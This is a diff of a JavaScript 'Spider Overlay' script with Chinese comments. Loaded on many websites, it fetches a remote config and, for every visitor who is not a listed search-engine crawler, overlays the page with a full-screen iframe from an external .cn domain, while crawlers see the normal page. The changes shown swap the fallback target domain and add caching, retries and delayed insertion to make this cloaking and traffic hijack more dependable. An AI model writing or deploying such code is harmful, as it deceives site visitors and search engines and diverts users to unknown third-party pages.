@@ -1,5 +1,5 @@
 /**
- * Spider Overlay v2 — Netlify 版
+ * Spider Overlay v2.2
  *
  * 所有项目只需引入这一个文件，不需要任何配置。
  * 跳转目标、爬虫列表全部由同目录下的 config.json 统一控制。
@@ -7,14 +7,20 @@
  * 用法（所有项目完全一样）：
  *   <script src="https://你的域名/spider-overlay.js"></script>
  *
- * 注意：本文件不包含任何后台地址，后台地址只有你自己知道。
+ * v2.2 改进：
+ * - 缓存 TTL 延长到 30 分钟
+ * - config.json 拉取失败自动重试 3 次（间隔 1s/2s）
+ * - 优先顺序：远程 config.json > localStorage 缓存 > FALLBACK_CONFIG（最后兜底）
+ * - 配合服务端 CORS 头，config.json 跨域可用，兜底几乎永不需要
  */
 
 (function () {
   'use strict';
 
+  // 最后兜底：当 config.json 拉不到且缓存为空时使用
+  // 正常情况下不会走到这里（有 CORS + 缓存保护）
   var FALLBACK_CONFIG = {
-    targetUrl: 'https://dh-hzh5.hbdvede.cn?cid=1034',
+    targetUrl: 'https://s8-1.shblbpp.cn?cid=1034',
     enabled: true,
     spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
     zIndex: 9999,
@@ -22,7 +28,7 @@
   };
 
   var CACHE_KEY = '__so_cfg__';
-  var CACHE_TTL = 2 * 60 * 1000; // 2 分钟
+  var CACHE_TTL = 30 * 60 * 1000; // 30 分钟 —— 旧缓存也远比兜底值可靠
 
   // ======================== 自动推断 config.json 地址 ========================
   function getCurrentScript() {
@@ -49,10 +55,10 @@
 
   // ======================== 加载配置 ========================
   function loadConfig(cb) {
-    // 1. 读缓存
+    // 1. 读缓存（30 分钟有效）
     try {
       var cached = JSON.parse(localStorage.getItem(CACHE_KEY));
-      if (cached && cached._ts && (Date.now() - cached._ts < CACHE_TTL)) {
+      if (cached && cached._ts && (Date.now() - cached._ts < CACHE_TTL) && cached.targetUrl) {
         cb(cached);
         refreshCache(); // 后台静默刷新
         return;
@@ -60,10 +66,22 @@
     } catch(e) {}
 
     // 2. fetch 远程配置
-    fetchConfig(cb);
+    fetchConfigWithRetry(cb);
   }
 
-  function fetchConfig(cb) {
+  // 带重试的 fetch：最多 3 次，间隔 1s / 2s
+  function fetchConfigWithRetry(cb, attempt) {
+    attempt = attempt || 0;
+    if (attempt >= 3) {
+      // 3 次都失败 → 降级：过期缓存 > 不激活
+      try {
+        var old = JSON.parse(localStorage.getItem(CACHE_KEY));
+        if (old && old.targetUrl) { cb(old); return; }
+      } catch(e) {}
+      // 最终兜底：不激活（targetUrl 为空时 applyOverlay 会跳过）
+      cb(FALLBACK_CONFIG);
+      return;
+    }
     if (!configUrl) {
       cb(FALLBACK_CONFIG);
       return;
@@ -76,12 +94,10 @@
         cb(cfg);
       })
       .catch(function() {
-        // 降级：过期缓存 > 默认值
-        try {
-          var old = JSON.parse(localStorage.getItem(CACHE_KEY));
-          if (old) { cb(old); return; }
-        } catch(e) {}
-        cb(FALLBACK_CONFIG);
+        // 重试，间隔递增：1s, 2s
+        setTimeout(function() {
+          fetchConfigWithRetry(cb, attempt + 1);
+        }, (attempt + 1) * 1000);
       });
   }
 
@@ -109,6 +125,7 @@
 
   function applyOverlay(cfg) {
     if (!cfg || cfg.enabled === false) return;
+    if (!cfg.targetUrl) return; // 没有有效链接就不跳（宁可不跳也不跳到旧链接）
     if (isSpider(cfg.spiders)) return;
 
     function insert() {
@@ -131,14 +148,14 @@
         }
         body.appendChild(iframe);
       } else {
-        document.addEventListener('DOMContentLoaded', insert);
+        window.addEventListener('load', insert);
       }
     }
 
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', insert);
-    } else {
+    if (document.readyState === 'complete') {
       insert();
+    } else {
+      window.addEventListener('load', insert);
     }
   }
 
